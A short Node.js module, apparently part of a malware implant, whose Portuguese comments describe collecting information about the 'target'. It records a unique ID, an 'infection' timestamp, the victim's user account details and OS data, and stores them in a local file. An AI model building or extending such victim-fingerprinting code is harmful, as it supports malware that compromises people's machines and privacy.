const os = require('os')
const fs = require('fs')
const uniqid = require('uniqid')
const { sysInfoPath } = require('../config')



class MachineManager{

    //levanta informações do alvo
    static gererateId(){
        const systemInfo = {
            uuid: uniqid(),
            infection: Date.now(),
            user: os.userInfo(),
            os: {
                type: os.type(),
                platform: os.platform(),
                arch: os.arch(),
                realise: os.release() 
            }
        }
        //escreve local
        fs.writeFileSync(sysInfoPath, JSON.stringify(systemInfo))

        return systemInfo
    }
    static loadId(){
        if(!fs.existsSync(sysInfoPath)){
            return null
        }
        var systemInfo = JSON.parse(fs.readFileSync(sysInfoPath))
        if(typeof systemInfo != 'object'){
            return null
        }
        return systemInfo
    }
    static deleteId(){
        fs.unlinkSync(sysInfoPath)
    }
   
}

module.exports = MachineManager